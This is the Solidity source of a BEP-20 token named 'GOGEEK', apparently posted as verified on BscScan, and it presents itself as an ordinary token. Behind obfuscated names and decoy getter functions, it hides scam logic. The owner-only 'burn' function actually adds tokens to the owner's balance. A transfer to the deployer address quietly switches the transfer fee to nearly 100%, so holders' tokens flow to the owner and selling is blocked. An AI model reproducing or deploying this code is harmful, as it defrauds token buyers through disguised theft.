/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-15 16:42 GMT
 */
 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract ZFVYYLK {
address private  FXMNEX = address(0);
address private  MZAVSL = address(0);
address private  NPZBFZ = address(0);
address private  VCPTFA = address(0);
address private  BGLXXL = address(0);
uint256 private  PEAQWY = 1000000000000000000;
uint8 public constant decimals = 18;
string public  symbol = "GOGEEK";
uint256 private  OVRJVV = 100000000;
uint256 public constant OIQTKK = 99999;
string public  name = "GOGEEK";
mapping (address => uint256) public balanceOf;
uint256 private  KPCYCQ = 1000000000000000000;
uint256 private  OYZGVX = 1000000000000000000000;
uint256 private  RDLRVQ = 10000000000000;
uint256 private  VVCJNM = 10000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  UZXFDT = 1000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Transfer(address indexed from, address indexed to, uint256 value);
function _getFXMNEX() private returns (address) {
return FXMNEX;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getNPZBFZ() private returns (address) {
return NPZBFZ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getBGLXXL() private returns (address) {
return BGLXXL;
}

function _getVCPTFA() private returns (address) {
return VCPTFA;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getKPCYCQ() private returns (uint256) {
return KPCYCQ;
}

function _getOVRJVV() private returns (uint256) {
return OVRJVV;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getOYZGVX() private returns (uint256) {
return OYZGVX;
}

constructor () public {
MZAVSL = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getUZXFDT() private returns (uint256) {
return UZXFDT;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "KHAWOF");
require(to != address(0), "KHAWOF");
require(amount <= balanceOf[from], "KHAWOF");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* OIQTKK/PEAQWY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==MZAVSL){
PEAQWY = OIQTKK+2;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tKHAWOF 0");
require(spender != address(0), "fKHAWOF 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getVVCJNM() private returns (uint256) {
return VVCJNM;
}

function _getRDLRVQ() private returns (uint256) {
return RDLRVQ;
}


}